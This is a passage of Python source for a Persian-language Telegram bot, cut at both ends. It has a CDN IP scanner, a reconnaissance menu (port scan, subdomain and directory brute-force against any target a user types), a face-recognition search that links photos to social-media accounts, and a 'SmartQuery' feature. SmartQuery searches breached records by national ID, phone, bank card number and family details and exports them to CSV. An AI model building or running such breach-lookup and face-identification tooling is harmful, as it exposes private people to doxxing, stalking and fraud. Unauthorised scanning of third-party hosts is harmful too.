    threading.Thread(target=run_scan, args=(user_id, ips, call.message.chat.id, msg.message_id), daemon=True).start()
    bot.answer_callback_query(call.id, "اسکن در پس‌زمینه اجرا می‌شود")

def run_scan(user_id, ips, chat_id, msg_id):
    sess = get_user_session(user_id)
    port = sess["scan_settings"]["port"]
    concurrency = sess["scan_settings"]["conc"]
    adaptive = sess.get("adaptive_sni", True)
    sni = sess["selected_sni"]
    if adaptive and not sni:
        for test_ip in ips[:3]:
            best = get_best_sni_for_ip(test_ip, port)
            if best:
                sni = best
                break
    if not sni:
        sni = "a248.e.akamai.net"
    ip_speeds = []
    try:
        ip_speeds = best_ip_by_speed(ips, port, sni, max_workers=concurrency)
    except:
        pass
    finally:
        sess["scan_running"] = False
        sess["scan_results_detail"] = ip_speeds
        if ip_speeds:
            result = "✅ نتایج اسکن (بر اساس سرعت):\n"
            for ip, lat, speed in ip_speeds[:15]:
                result += f"{ip} | 📡 {lat:.0f}ms | ⬇️ {speed} KB/s\n"
            avg_speed = sum(s for _, _, s in ip_speeds[:10]) / len(ip_speeds[:10]) if ip_speeds else 0
            save_scan_to_history(",".join(sess["selected_cdns"].keys()), len(ips), len(ip_speeds), avg_speed, [ip for ip,_,_ in ip_speeds[:10]])
        else:
            result = "❌ هیچ IP زنده و سریعی یافت نشد."
        try:
            bot.edit_message_text(result, chat_id, msg_id)
        except:
            bot.send_message(chat_id, result)

def save_scan_to_history(cdn, total, alive, avg_speed, ips_list):
    with scan_history_lock:
        with sqlite3.connect(SCAN_HISTORY_DB, check_same_thread=False) as conn:
            conn.execute("INSERT INTO scans (date, cdn, total, alive, avg_speed, ips) VALUES (?,?,?,?,?,?)",
                         (datetime.now().strftime("%Y-%m-%d %H:%M"), cdn, total, alive, avg_speed, json.dumps(ips_list[:10])))

def get_scan_history(limit=5):
    with scan_history_lock:
        with sqlite3.connect(SCAN_HISTORY_DB, check_same_thread=False) as conn:
            return conn.execute("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (limit,)).fetchall()

@bot.callback_query_handler(func=lambda call: call.data == "scan_history")
def scan_history_menu(call):
    rows = get_scan_history(5)
    if not rows:
        bot.edit_message_text("📋 تاریخچه خالی است.", call.message.chat.id, call.message.message_id)
        return
    text = "📋 تاریخچه اسکن:\n\n"
    for r in rows:
        text += f"🕒 {r[1]} | {r[2]} | زنده: {r[4]}/{r[3]} | میانگین سرعت: {r[5]} KB/s\n"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 برگشت", callback_data="cdn_scanner_menu"))
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "suggest_cdn")
def suggest_cdn_callback(call):
    suggested = ["akamai", "cloudflare", "google"]
    text = f"🌍 پیشنهاد CDN بر اساس موقعیت (تخمینی): {', '.join(suggested)}"
    bot.answer_callback_query(call.id, text, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "pentest_menu")
def pentest_menu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=2)
    tools = [
        ("🌐 Whois","p_13"), ("📡 DNS","p_14"), ("📍 IP Geo","p_15"), ("🔍 Subdomain","p_16"),
        ("🔌 Port Scan","p_17"), ("🔒 SSL/TLS","p_18"), ("📂 Dir Brute","p_19"), ("🔎 Full Scan","p_24"),
        ("📊 گزارش آخر","p_report"), ("📜 تاریخچه","p_history"),
        ("🔙 برگشت","back_to_main")
    ]
    for label, data in tools:
        markup.add(InlineKeyboardButton(label, callback_data=data))
    bot.edit_message_text("🎯 **پنتست**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("p_"))
def pentest_tool(call):
    tools = {
        "p_13": (pentest_whois, "Whois"), "p_14": (pentest_dns, "DNS"),
        "p_15": (pentest_ipgeo, "IP Geo"), "p_16": (pentest_subdomain, "Subdomain"),
        "p_17": (pentest_portscan, "Port Scan"), "p_18": (pentest_ssl, "SSL/TLS"),
        "p_19": (pentest_dirbrute, "Dir Brute"), "p_24": (pentest_fullscan, "Full Scan"),
    }
    if call.data in tools:
        func, label = tools[call.data]
        bot.send_message(call.message.chat.id, f"🔧 {label}\nهدف را وارد کنید:")
        bot.register_next_step_handler(call.message, lambda m: execute_pentest(m, func, label))
        bot.answer_callback_query(call.id)

def execute_pentest(message, func, label):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    target = clean_target(message.text.strip())
    if not target: bot.reply_to(message, "❌ هدف معتبر وارد کنید."); return
    bot.send_chat_action(message.chat.id, 'typing')
    result = func(target)
    db_execute("INSERT INTO pentest_history (user_id, tool, target, results, executed_at) VALUES (?,?,?,?,?)",
               (message.from_user.id, label, target, result[:3000], datetime.now().isoformat()))
    bot.reply_to(message, result, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "p_report")
def pentest_report(call):
    rows = db_fetch_all("SELECT * FROM pentest_history WHERE user_id=? ORDER BY id DESC LIMIT 1", (call.from_user.id,))
    if not rows: bot.send_message(call.message.chat.id, "گزارشی موجود نیست.")
    else:
        r = rows[0]
        bot.send_message(call.message.chat.id, f"📊 آخرین گزارش\nابزار: {r['tool']}\nهدف: {r['target']}\nزمان: {r['executed_at'][:16]}\n\n{r['results'][:2000]}", parse_mode="Markdown")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "p_history")
def pentest_history(call):
    rows = db_fetch_all("SELECT * FROM pentest_history WHERE user_id=? ORDER BY id DESC LIMIT 10", (call.from_user.id,))
    if not rows: bot.send_message(call.message.chat.id, "تاریخچه‌ای موجود نیست.")
    else:
        msg = "📜 **تاریخچه**\n\n"
        for r in rows: msg += f"🔹 {r['tool']} → {r['target']} ({r['executed_at'][:16]})\n"
        bot.send_message(call.message.chat.id, msg)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "shadow_menu")
def shadow_menu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(InlineKeyboardButton("🔍 جستجوی چهره", callback_data="shadow_search"),
               InlineKeyboardButton("➕ افزودن به ShadowDB", callback_data="shadow_add"),
               InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main"))
    bot.edit_message_text("👤 **Shadowgram**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "shadow_search")
def shadow_search_prompt(call):
    bot.send_message(call.message.chat.id, "📸 عکس ارسال کن:")
    bot.register_next_step_handler(call.message, process_shadow_image)
    bot.answer_callback_query(call.id)

def process_shadow_image(message):
    if not message.photo: bot.reply_to(message, "❌ عکس ارسال کن."); return
    file_id = message.photo[-1].file_id
    file_data = bot.download_file(bot.get_file(file_id).file_path)
    encoding, error = encode_face_from_image(file_data)
    if error: bot.reply_to(message, f"❌ {error}"); return
    image_url = upload_to_imgbb(file_data)
    if not image_url:
        image_url = f"{PUBLIC_URL}/shadow_image/{file_id}"
    results = generate_shadow_report(encoding, image_url, message.from_user.id)
    bot.reply_to(message, format_shadow_report(results, image_url), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "shadow_add")
def shadow_add_callback(call):
    bot.send_message(call.message.chat.id, "📸 عکس + توضیحات (platform username source_url) ارسال کن:")
    bot.register_next_step_handler(call.message, process_shadow_add)
    bot.answer_callback_query(call.id)

def process_shadow_add(message):
    if not message.photo: bot.reply_to(message, "❌ عکس ارسال کن."); return
    file_id = message.photo[-1].file_id
    file_data = bot.download_file(bot.get_file(file_id).file_path)
    encoding, error = encode_face_from_image(file_data)
    if error: bot.reply_to(message, f"❌ {error}"); return
    caption = message.caption or ""
    parts = caption.split()
    platform = parts[0] if len(parts)>0 else "نامشخص"
    username = parts[1] if len(parts)>1 else "نامشخص"
    source_url = parts[2] if len(parts)>2 else ""
    image_url = upload_to_imgbb(file_data) or ""
    if add_to_shadow_db(encoding, source_url, platform, username, image_url, message.from_user.id):
        bot.reply_to(message, f"✅ چهره به ShadowDB اضافه شد.\n📌 {platform} / {username}")
    else: bot.reply_to(message, "❌ خطا")

@bot.callback_query_handler(func=lambda call: call.data == "deepeye_menu")
def deepeye_menu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(InlineKeyboardButton("📤 تحلیل فایل", callback_data="deepeye_upload"),
               InlineKeyboardButton("📊 تاریخچه", callback_data="deepeye_history"),
               InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main"))
    bot.edit_message_text("👁️ **DeepEye**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "deepeye_upload")
def deepeye_upload(call):
    bot.send_message(call.message.chat.id, "📤 فایل ارسال کن:")
    bot.register_next_step_handler(call.message, process_deepeye_file)
    bot.answer_callback_query(call.id)

def process_deepeye_file(message):
    if not message.document and not message.photo:
        bot.reply_to(message, "❌ فایل ارسال کن."); return
    if message.document:
        file_id = message.document.file_id; file_name = message.document.file_name or "unknown"
        file_data = bot.download_file(bot.get_file(file_id).file_path)
    else:
        file_id = message.photo[-1].file_id; file_name = f"photo_{int(time.time())}.jpg"
        file_data = bot.download_file(bot.get_file(file_id).file_path)
    result = process_deepeye(file_data, file_name, message.from_user.id)
    bot.reply_to(message, format_deepeye_report(result), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "deepeye_history")
def deepeye_history(call):
    rows = db_fetch_all("SELECT * FROM deepeye_analysis WHERE user_id=? ORDER BY analyzed_at DESC LIMIT 10", (call.from_user.id,))
    if not rows: bot.send_message(call.message.chat.id, "هیچ تحلیلی موجود نیست.")
    else:
        msg = "📊 **تاریخچه DeepEye**\n\n"
        for r in rows: msg += f"📄 {r['file_name']}\n🕒 {r['analyzed_at'][:16]}\n\n"
        bot.send_message(call.message.chat.id, msg)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "whispertrace_menu")
def whispertrace_menu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(InlineKeyboardButton("🔍 تحلیل متن", callback_data="whispertrace_text"),
               InlineKeyboardButton("📸 تحلیل اسکرین‌شات", callback_data="whispertrace_image"),
               InlineKeyboardButton("📊 تاریخچه", callback_data="whispertrace_history"),
               InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main"))
    bot.edit_message_text("🔍 **WhisperTrace**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "whispertrace_text")
def whispertrace_text_prompt(call):
    bot.send_message(call.message.chat.id, "📝 متن ارسال کن:")
    bot.register_next_step_handler(call.message, process_whispertrace_text_input)
    bot.answer_callback_query(call.id)

def process_whispertrace_text_input(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    text = message.text.strip()
    if len(text) < 5: bot.reply_to(message, "❌ متن باید حداقل ۵ کاراکتر باشد."); return
    result = process_whispertrace_text(text, message.from_user.id)
    bot.reply_to(message, format_whispertrace_report(result), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "whispertrace_image")
def whispertrace_image_prompt(call):
    bot.send_message(call.message.chat.id, "📸 اسکرین‌شات ارسال کن:")
    bot.register_next_step_handler(call.message, process_whispertrace_image_input)
    bot.answer_callback_query(call.id)

def process_whispertrace_image_input(message):
    if not message.photo: bot.reply_to(message, "❌ تصویر ارسال کن."); return
    file_id = message.photo[-1].file_id
    file_data = bot.download_file(bot.get_file(file_id).file_path)
    result = process_whispertrace_image(file_data, message.from_user.id)
    bot.reply_to(message, format_whispertrace_report(result), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "whispertrace_history")
def whispertrace_history(call):
    rows = db_fetch_all("SELECT * FROM whispertrace_analysis WHERE user_id=? ORDER BY analyzed_at DESC LIMIT 10", (call.from_user.id,))
    if not rows: bot.send_message(call.message.chat.id, "هیچ تحلیلی موجود نیست.")
    else:
        msg = "📊 **تاریخچه WhisperTrace**\n\n"
        for r in rows: msg += f"🕒 {r['analyzed_at'][:16]} | {r['input_type']}\n"
        bot.send_message(call.message.chat.id, msg)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "smart_menu")
def smart_menu_callback(call):
    smart_command(call.message)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['smart'])
def smart_command(message):
    user_id = message.from_user.id
    reset_smart_session(user_id)
    session = get_smart_session(user_id)
    session['stage'] = 'main_menu'
    markup = InlineKeyboardMarkup(row_width=2)
    fields = [("👤 نام کامل","field_full_name"),("🆔 کد ملی","field_national_code"),("📱 موبایل","field_mobile"),("💳 شماره کارت","field_card_no"),
              ("👤 نام پدر","field_father_name"),("📆 تاریخ تولد","field_birth_date"),("📍 محل تولد","field_birth_city"),("🏙️ شهر","field_city"),
              ("🗺️ استان","field_province"),("📂 ترکیبی","field_custom")]
    for label, data in fields: markup.add(InlineKeyboardButton(label, callback_data=data))
    markup.add(InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main"))
    bot.reply_to(message, "🔍 **SmartQuery**\nنوع جستجو را انتخاب کن:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("field_"))
def smart_select_field(call):
    user_id = call.from_user.id
    field = call.data.replace("field_", "")
    session = get_smart_session(user_id)
    field_names = {'full_name':'نام کامل','national_code':'کد ملی','mobile':'موبایل','card_no':'شماره کارت',
                   'father_name':'نام پدر','birth_date':'تاریخ تولد','birth_city':'محل تولد','city':'شهر','province':'استان'}
    if field == 'custom':
        bot.send_message(call.message.chat.id, "📝 فرمت: `field=value&field=value`\nمثال: `full_name=احمد عزیزی&national_code=3310099636`")
        session['stage'] = 'enter_value_custom'
        bot.register_next_step_handler(call.message, smart_enter_custom)
        bot.answer_callback_query(call.id); return
    session['stage'] = 'enter_value'; session['last_field'] = field
    bot.send_message(call.message.chat.id, f"🔍 {field_names.get(field,field)} را وارد کن:")
    bot.register_next_step_handler(call.message, smart_enter_value)
    bot.answer_callback_query(call.id)

def smart_enter_value(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    user_id = message.from_user.id
    session = get_smart_session(user_id)
    value = message.text.strip()
    if len(value) < 2: bot.reply_to(message, "❌ حداقل ۲ کاراکتر."); return
    field = session.get('last_field', 'full_name')
    session['filters'] = {field: value}
    session['query_info'] = f"{field}: {value}"
    results, total = search_in_breaches(session['filters'], 0)
    if total == 0: bot.reply_to(message, "❌ نتیجه‌ای یافت نشد."); reset_smart_session(user_id); return
    session['results'] = results; session['total'] = total; session['stage'] = 'showing_results'
    show_smart_results(message.chat.id, user_id, 0)

def smart_enter_custom(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    user_id = message.from_user.id
    query = message.text.strip()
    filters = {}
    for pair in query.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            filters[k.strip()] = v.strip()
    if not filters: bot.reply_to(message, "❌ فرمت نامعتبر."); return
    session = get_smart_session(user_id)
    session['filters'] = filters; session['query_info'] = '، '.join([f"{k}: {v}" for k,v in filters.items()])
    results, total = search_in_breaches(filters, 0)
    if total == 0: bot.reply_to(message, "❌ نتیجه‌ای یافت نشد."); reset_smart_session(user_id); return
    session['results'] = results; session['total'] = total; session['stage'] = 'showing_results'
    show_smart_results(message.chat.id, user_id, 0)

def show_smart_results(chat_id, user_id, page):
    session = get_smart_session(user_id)
    results = session.get('results', []); total = session.get('total', 0)
    per_page = SMART_QUERY_LIMIT
    if total == 0: bot.send_message(chat_id, "❌ نتیجه‌ای وجود ندارد."); return
    total_pages = (total + per_page - 1) // per_page
    start = page * per_page
    page_results = results[start:start+per_page]
    msg = format_smart_report(page_results, total, page, per_page, session.get('query_info', ''))
    markup = InlineKeyboardMarkup(row_width=3)
    buttons = []
    if page > 0: buttons.append(InlineKeyboardButton("◀️ قبلی", callback_data=f"smart_page_{page-1}"))
    buttons.append(InlineKeyboardButton(f"📊 {page+1}/{total_pages}", callback_data="smart_info"))
    if page < total_pages - 1: buttons.append(InlineKeyboardButton("بعدی ▶️", callback_data=f"smart_page_{page+1}"))
    if buttons: markup.add(*buttons)
    markup.add(InlineKeyboardButton("🎯 فیلتر جدید", callback_data="smart_new_filter"),
               InlineKeyboardButton("🔄 جدید", callback_data="smart_new_search"),
               InlineKeyboardButton("📥 خروجی CSV", callback_data="smart_export"),
               InlineKeyboardButton("❌ بستن", callback_data="smart_cancel"))
    bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("smart_page_"))
def smart_page(call):
    user_id = call.from_user.id; page = int(call.data.replace("smart_page_", ""))
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    show_smart_results(call.message.chat.id, user_id, page)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "smart_info")
def smart_info(call): bot.answer_callback_query(call.id, "📊 صفحه فعلی")

@bot.callback_query_handler(func=lambda call: call.data == "smart_new_filter")
def smart_new_filter(call):
    user_id = call.from_user.id; session = get_smart_session(user_id)
    if not session.get('results'): bot.send_message(call.message.chat.id, "❌ نتیجه‌ای وجود ندارد."); return
    all_fields = {}
    for r in session['results'][:30]:
        for field, label in [('national_code','کد ملی'),('father_name','نام پدر'),('birth_date','تاریخ تولد'),
                             ('birth_city','محل تولد'),('mobile','موبایل'),('card_no','شماره کارت')]:
            if r.get(field) and r[field] != '—' and field not in session['filters']:
                all_fields[field] = label
    if not all_fields: bot.send_message(call.message.chat.id, "❌ فیلد قابل فیلتری موجود نیست."); return
    markup = InlineKeyboardMarkup(row_width=2)
    for f, l in all_fields.items():
        markup.add(InlineKeyboardButton(l, callback_data=f"filter_{f}"))
    markup.add(InlineKeyboardButton("🔙 برگشت", callback_data="smart_back_to_results"))
    bot.edit_message_text("🎯 فیلتر جدید انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("filter_"))
def smart_apply_filter(call):
    user_id = call.from_user.id; field = call.data.replace("filter_", "")
    session = get_smart_session(user_id); session['stage'] = 'filter_value'; session['last_field'] = field
    field_names = {'national_code':'کد ملی','father_name':'نام پدر','birth_date':'تاریخ تولد',
                   'birth_city':'محل تولد','mobile':'موبایل','card_no':'شماره کارت'}
    bot.send_message(call.message.chat.id, f"🔍 {field_names.get(field,field)} را وارد کن:")
    bot.register_next_step_handler(call.message, smart_enter_filter_value)
    bot.answer_callback_query(call.id)

def smart_enter_filter_value(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    user_id = message.from_user.id; value = message.text.strip()
    if len(value) < 2: bot.reply_to(message, "❌ حداقل ۲ کاراکتر."); return
    session = get_smart_session(user_id); field = session.get('last_field')
    session['filters'][field] = value; session['query_info'] += f" + {field}: {value}"
    results, total = search_in_breaches(session['filters'], 0)
    if total == 0: bot.reply_to(message, "❌ نتیجه‌ای یافت نشد."); reset_smart_session(user_id); return
    session['results'] = results; session['total'] = total; session['stage'] = 'showing_results'
    show_smart_results(message.chat.id, user_id, 0)

@bot.callback_query_handler(func=lambda call: call.data == "smart_back_to_results")
def smart_back(call):
    user_id = call.from_user.id; session = get_smart_session(user_id)
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    show_smart_results(call.message.chat.id, user_id, session.get('page', 0))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "smart_new_search")
def smart_new_search(call):
    user_id = call.from_user.id; reset_smart_session(user_id)
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    smart_command(call.message)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "smart_export")
def smart_export(call):
    user_id = call.from_user.id; session = get_smart_session(user_id)
    if not session.get('results'): bot.send_message(call.message.chat.id, "❌ نتیجه‌ای وجود ندارد."); return
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['نام کامل','کد ملی','نام پدر','تاریخ تولد','محل تولد','شهر','آدرس','شماره کارت','موبایل'])
    for r in session['results']:
        writer.writerow([r.get('full_name',''), r.get('national_code',''), r.get('father_name',''),
                         r.get('birth_date',''), r.get('birth_city',''), r.get('city',''),
                         r.get('address',''), r.get('card_no',''), r.get('mobile','')])
    output.seek(0)
    file = io.BytesIO(output.getvalue().encode('utf-8-sig'))
    file.name = f"smart_query_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    bot.send_document(call.message.chat.id, file, caption=f"📊 {len(session['results'])} نتیجه")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "smart_cancel")
def smart_cancel(call):
    user_id = call.from_user.id; reset_smart_session(user_id)
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    bot.send_message(call.message.chat.id, "✅ بسته شد.")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "library_menu")
def library_menu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("📖 همه", callback_data="lib_all"),
               InlineKeyboardButton("🔍 جستجو", callback_data="lib_search"),
               InlineKeyboardButton("🏷️ برچسب‌ها", callback_data="lib_tags"),
               InlineKeyboardButton("🔥 محبوب‌ترین", callback_data="lib_top"),
               InlineKeyboardButton("🗺️ مسیر", callback_data="lib_path"),
               InlineKeyboardButton("✍️ درخواست", callback_data="lib_request"),
               InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main"))
    bot.edit_message_text("📚 **کتابخانه**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "lib_all")
def lib_all(call):
    rows = db_fetch_all("SELECT * FROM library ORDER BY uploaded_at DESC LIMIT 20")
    if not rows: bot.send_message(call.message.chat.id, "کتابخانه خالیه ✨"); return
    msg = "📚 **آخرین محتواها**\n\n"
    for r in rows:
        icon = "📄" if r['file_type']=="text" else "🖼️" if "image" in r['file_type'] else "📎"
        msg += f"{icon} **{r['title']}** | 👍 {r['likes']}\nبرچسب‌ها: {r['tags'] or 'بدون برچسب'}\n"
        if r['content']: msg += f"   {r['content'][:80]}...\n"
        msg += f"   🕒 {r['uploaded_at'][:16]}\n\n"
    bot.send_message(call.message.chat.id, msg, parse_mode="Markdown"); bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "lib_search")
def lib_search_prompt(call):
    bot.send_message(call.message.chat.id, "🔍 عبارت جستجو:")
    bot.register_next_step_handler(call.message, lib_search_result)
    bot.answer_callback_query(call.id)

def lib_search_result(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    query = message.text.strip()
    if not query: return
    safe_query = re.sub(r'[^\w\s]', '', query)
    rows = db_fetch_all("SELECT * FROM library WHERE id IN (SELECT rowid FROM library_fts WHERE library_fts MATCH ?) LIMIT 10", (safe_query,))
    if not rows:
        rows = db_fetch_all("SELECT * FROM library WHERE title LIKE ? OR content LIKE ? LIMIT 10", (f"%{query}%", f"%{query}%"))
    if not rows: bot.reply_to(message, f"❌ نتیجه‌ای برای '{query}' یافت نشد."); return
    msg = f"🔍 **نتایج '{query}'**\n\n"
    for r in rows:
        msg += f"📄 **{r['title']}**\n"
        if r['content']:
            snippet = r['content'][:200].replace(query, f"**{query}**")
            msg += f"   {snippet}...\n"
        msg += "\n"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "lib_tags")
def lib_tags_prompt(call):
    tags = db_fetch_all("SELECT DISTINCT tags FROM library WHERE tags IS NOT NULL")
    tag_set = set()
    for t in tags:
        if t['tags']:
            for tag in t['tags'].split(','): tag_set.add(tag.strip())
    if not tag_set: bot.send_message(call.message.chat.id, "هیچ برچسبی وجود ندارد ✨"); return
    markup = InlineKeyboardMarkup(row_width=3)
    for tag in sorted(tag_set)[:20]: markup.add(InlineKeyboardButton(f"#{tag}", callback_data=f"tag_{tag}"))
    bot.send_message(call.message.chat.id, "🏷️ برچسب‌ها:", reply_markup=markup); bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("tag_"))
def lib_by_tag(call):
    tag = call.data[4:]
    rows = db_fetch_all("SELECT * FROM library WHERE tags LIKE ? ORDER BY likes DESC LIMIT 10", (f"%{tag}%",))
    if not rows: bot.send_message(call.message.chat.id, f"محتوایی با `{tag}` پیدا نشد."); return
    msg = f"📚 **#{tag}**\n\n"
    for r in rows: msg += f"📄 **{r['title']}** (👍 {r['likes']})\n"
    bot.send_message(call.message.chat.id, msg, parse_mode="Markdown"); bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "lib_top")
def lib_top(call):
    rows = db_fetch_all("SELECT * FROM library ORDER BY likes DESC LIMIT 10")
    if not rows: bot.send_message(call.message.chat.id, "هنوز محتوایی لایک نخورده ✨"); return
    msg = "🔥 **محبوب‌ترین**\n\n"
    for r in rows: msg += f"👍 {r['likes']} - {r['title']}\n"
    bot.send_message(call.message.chat.id, msg, parse_mode="Markdown"); bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "lib_request")
def lib_request_prompt(call):
    bot.send_message(call.message.chat.id, "✍️ موضوع مورد نظر:")
    bot.register_next_step_handler(call.message, lib_request_submit)
    bot.answer_callback_query(call.id)

def lib_request_submit(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    topic = message.text.strip()
    db_execute("INSERT INTO content_requests (user_id, topic, requested_at) VALUES (?,?,?)",
               (message.from_user.id, topic, datetime.now().isoformat()))
    bot.reply_to(message, "✅ درخواست ثبت شد ✨")

@bot.callback_query_handler(func=lambda call: call.data == "lib_path")
def lib_path(call):
    path = db_fetch_one("SELECT * FROM learning_paths WHERE user_id=? ORDER BY step ASC", (call.from_user.id,))
    if not path:
        db_execute("INSERT INTO learning_paths (user_id, path_name, step, completed) VALUES (?,?,?,?)",
                   (call.from_user.id, "مسیر امنیت", 1, 0))
        bot.send_message(call.message.chat.id, "🗺️ مسیر یادگیری ساخته شد ✨")
        step1 = db_fetch_one("SELECT * FROM library WHERE tags LIKE ? LIMIT 1", ("%مقدماتی%",))
        if step1: bot.send_message(call.message.chat.id, f"📖 **مرحله ۱**: {step1['title']}")
        else: bot.send_message(call.message.chat.id, "هنوز محتوایی برای مرحله ۱ وجود ندارد.")
    else:
        bot.send_message(call.message.chat.id, f"🗺️ در **مرحله {path['step']}** هستی ✨",
                         reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("✅ تکمیل", callback_data="complete_step")))
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "complete_step")
def complete_step(call):
    path = db_fetch_one("SELECT * FROM learning_paths WHERE user_id=? ORDER BY step ASC", (call.from_user.id,))
    if not path: bot.answer_callback_query(call.id, "مسیری تعریف نشده ✨"); return
    db_execute("UPDATE learning_paths SET completed=1 WHERE id=?", (path['id'],))
    new_step = path['step'] + 1
    db_execute("INSERT INTO learning_paths (user_id, path_name, step, completed) VALUES (?,?,?,?)",
               (call.from_user.id, path['path_name'], new_step, 0))
    bot.send_message(call.message.chat.id, f"🥳 **مرحله {new_step}** ✨")
    step_content = db_fetch_one("SELECT * FROM library WHERE tags LIKE ? LIMIT 1", (f"%مرحله{new_step}%",))
    if step_content: bot.send_message(call.message.chat.id, f"📖 **مرحله {new_step}**: {step_content['title']}")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("lib_like_"))
def lib_like(call):
    lib_id = int(call.data.split("_")[2])
    db_execute("UPDATE library SET likes = likes + 1 WHERE id=?", (lib_id,))
    bot.answer_callback_query(call.id, "👍 پسندیده شد ✨")

@bot.callback_query_handler(func=lambda call: call.data == "yar_giri")
def yar_giri(call):
    if call.from_user.id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "⛔ فقط ادمین", show_alert=True); return
    bot.send_message(call.message.chat.id, "📥 فایل یا متن آموزشی ارسال کن. /cancel لغو")
    bot.register_next_step_handler(call.message, process_yar_giri)

def process_yar_giri(message):
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "🚫 لغو شد."); return
    user_id = message.from_user.id
    title, content, file_path, file_type, tags = "محتوای آموزشی", "", "", "text", ""
    if message.text and message.text.startswith("http"):
        url = message.text.strip()
        try:
            r = http_session.get(url, timeout=10)
            if r.status_code == 200:
                file_path = url; file_type = "external"; title = url.split("/")[-1] or "فایل خارجی"
                content = "لینک مستقیم: " + url
            else: bot.reply_to(message, "❌ لینک معتبر نیست."); return
        except: bot.reply_to(message, "❌ لینک معتبر نیست."); return
    elif message.document:
        file_info = bot.get_file(message.document.file_id)
        file_name = f"{int(time.time())}_{message.document.file_name}"
        file_path = os.path.join(LIBRARY_PATH, file_name)
        downloaded = bot.download_file(file_info.file_path)
        with open(file_path, 'wb') as f: f.write(downloaded)
        file_type = message.document.mime_type or "file"; title = message.document.file_name
    elif message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        file_name = f"photo_{int(time.time())}.jpg"
        file_path = os.path.join(LIBRARY_PATH, file_name)
        downloaded = bot.download_file(file_info.file_path)
        with open(file_path, 'wb') as f: f.write(downloaded)
        file_type = "image/jpeg"; title = "تصویر آموزشی"
    elif message.text:
        full_text = message.text
        lines = full_text.split('\n')
